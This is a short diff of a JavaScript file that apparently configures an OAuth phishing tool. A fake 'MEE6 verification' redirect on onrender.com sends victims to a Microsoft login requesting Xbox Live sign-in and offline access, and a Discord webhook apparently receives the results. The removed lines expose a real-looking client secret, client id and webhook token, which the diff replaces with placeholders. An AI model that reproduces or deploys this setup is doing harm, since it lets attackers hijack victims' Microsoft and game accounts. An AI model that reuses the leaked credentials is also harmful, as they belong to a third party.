@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = 'EaV8Q~CfhSYhHWtmBwpRbeE9fULev_td9n5kPcrD'
-const client_id = '65747f15-0980-40cc-a689-71a79aee68f1'
-const redirect_uri = 'https://mee6-verification.onrender.com/'
-const webhook_url = 'https://discordapp.com/api/webhooks/957645554886799420/bPHMZeleWNZlvm4h_G0dsntUM7isKiNd35riN5FpPTo4ICltg4prDILW0J6vi0VPkGZX'
+const client_secret = 'secret'
+const client_id = 'cid'
+const redirect_uri = 'redirect'
+const webhook_url = 'Your webhook'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
